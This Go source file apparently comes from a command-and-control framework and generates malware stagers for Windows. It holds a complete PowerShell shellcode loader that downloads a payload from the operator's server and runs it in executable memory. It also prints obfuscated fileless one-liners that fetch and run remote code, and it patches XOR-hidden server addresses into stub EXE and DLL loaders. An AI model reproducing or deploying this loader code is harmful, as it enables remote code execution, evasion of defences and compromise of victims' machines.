package generateopt

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var winType = []string{
	"exe",
	"ps1",
	"dll",
	//"vbs",
	//"vba",
	//"xsl",
}

type buildFunc func(stubData []byte, host, proto, target, outputPath string)

var BuildMap = make(map[string]buildFunc)

func InitBuildMap() {
	BuildMap["exe"] = GenerateExe
	BuildMap["dll"] = GenerateDLL
	BuildMap["ps1"] = GeneratePs1
}

func IsWinType(fileType string) bool {
	flag := false
	for _, t := range winType {
		if fileType == t {
			flag = true
		}
	}
	return flag
}

// powershell远程加载
func GeneratePs1(stubData []byte, host, proto, target, outputPath string) {
	stubStr := `
Set-StrictMode -Version 2

function get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )

    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
    $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

    return $var_type_builder.CreateType()
}

function get_proc_address {
    Param ($var_module, $var_procedure)     
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

If ([IntPtr]::size -eq 8) {
    $client = New-Object Net.WebClient
    [Byte[]]$var_code = $client.
    DownloadData("FlagUrl")

    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualAlloc), (get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (get_delegate_type @([IntPtr]) ([Void])))
    $var_runme.Invoke([IntPtr]::Zero)
}`
	url := fmt.Sprintf("%s://%s", proto, host)
	timeStr := strconv.FormatInt(time.Now().Unix(), 10)
	uploadPath := timeStr + ".ps1"
	urlTarget := fmt.Sprintf("%s/%s", url, target)

	if outputPath[len(outputPath)-3:] != "ps1" {
		outputPath += ".ps1"
	}
	urlOutput := fmt.Sprintf("%s/files/%s", url, uploadPath)
	output := strings.Replace(stubStr, "FlagUrl", urlTarget, -1)
	dstFile, err := os.Create(outputPath)
	if err != nil {
		message := fmt.Sprintf("%s", err.Error())
		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
		return
	}
	defer dstFile.Close()
	_, err = dstFile.WriteString(output)
	if err != nil {
		message := fmt.Sprintf("%s", err.Error())
		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
	}
	message := fmt.Sprintf("%s build successfully!", outputPath)
	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
	//发送ps1到server端
	// 发送文件元信息
	data := fileopt.GetFileMetaInfo(outputPath, uploadPath)
	retData := fileopt.SendFileMetaMsg("Server", data, "fileUpload")
	if retData.Code != retcode.SUCCESS {
		colorcode.PrintMessage(colorcode.SIGN_FAIL, "file upload failed")
		return
	}
	fileopt.SendFileData("Server", outputPath)
	select {
	case msg := <-common.DefaultMsgChan:
		outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
		fmt.Println(outputMsg)
	case <-time.After(10 * time.Second):
		colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
		return
	}
	message = fmt.Sprintf("You can use the following command to load remotely and filelessly \n"+
		colorcode.COLOR_YELLOW+"1. "+colorcode.END+"powershell.exe -nop -w 1 -c IEX(New-Object Net.WebClient).DownloadString('%s');\n"+
		colorcode.COLOR_YELLOW+"2. "+colorcode.END+"echo set-alias -name hhh -value IEX;hhh(New-Object \"NeT.WebC`li`ent\").\"Down`l`oadStr`ing\"('%s') | powershell\n"+
		colorcode.COLOR_YELLOW+"3. "+colorcode.END+"cmd.exe /c \"set p1=power&& set p2=shell && echo %s | clip&& cmd.exe /c echo [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); IEX(New-Object Net.WebClient).DownloadString([System.Windows.Forms.Clipboard]::GetText()) ^|%%p1%%%%p2%% -\"\n", urlOutput, urlOutput, urlOutput)
	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
}

// c-exe远程加载
func GenerateExe(stubData []byte, host, proto, target, outputPath string) {
	if outputPath[len(outputPath)-3:] != "exe" {
		outputPath += ".exe"
	}
	sIp := DoXor([]byte("255.255.255.255"))
	sPort := DoXor([]byte("65535"))
	sTarget := DoXor([]byte("files/loader1234567890abcdefghijklmnopqrstuvwxyz.bin"))
	sProto := DoXor([]byte("httpsorhttp123"))
	dIpStr, dPortStr, _ := strings.Cut(host, ":")
	dIp := DoXor([]byte(dIpStr))
	dPort := DoXor([]byte(dPortStr))
	dTarget := DoXor([]byte(target))
	dProto := DoXor([]byte(proto))

	stubData = ReplaceBytes(stubData, sIp, dIp)
	stubData = ReplaceBytes(stubData, sPort, dPort)
	stubData = ReplaceBytes(stubData, sProto, dProto)
	stubData = ReplaceBytes(stubData, sTarget, dTarget)
	err := ioutil.WriteFile(outputPath, stubData, 0777)
	if err != nil {
		message := fmt.Sprintf("%s", err.Error())
		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
		return
	}
	absOutputPath, _ := filepath.Abs(outputPath)
	message := fmt.Sprintf("%s build successfully!", absOutputPath)
	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
}

// c-dll远程加载
func GenerateDLL(stubData []byte, host, proto, target, outputPath string) {
	if outputPath[len(outputPath)-3:] != "dll" {
		outputPath += ".dll"
	}
	sIp := DoXor([]byte("255.255.255.255"))
	sPort := DoXor([]byte("65535"))
	sTarget := DoXor([]byte("files/loader1234567890abcdefghijklmnopqrstuvwxyz.bin"))
	sProto := DoXor([]byte("httpsorhttp123"))
	dIpStr, dPortStr, _ := strings.Cut(host, ":")
	dIp := DoXor([]byte(dIpStr))
	dPort := DoXor([]byte(dPortStr))
	dTarget := DoXor([]byte(target))
	dProto := DoXor([]byte(proto))

	stubData = ReplaceBytes(stubData, sIp, dIp)
	stubData = ReplaceBytes(stubData, sPort, dPort)
	stubData = ReplaceBytes(stubData, sProto, dProto)
	stubData = ReplaceBytes(stubData, sTarget, dTarget)
	err := ioutil.WriteFile(outputPath, stubData, 0777)
	if err != nil {
		message := fmt.Sprintf("%s", err.Error())
		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
		return
	}
	absOutputPath, _ := filepath.Abs(outputPath)
	message := fmt.Sprintf("%s build successfully!", absOutputPath)
	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
	message = fmt.Sprintf("you can use [rundll32.exe %s,main] to load", absOutputPath)
	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
}
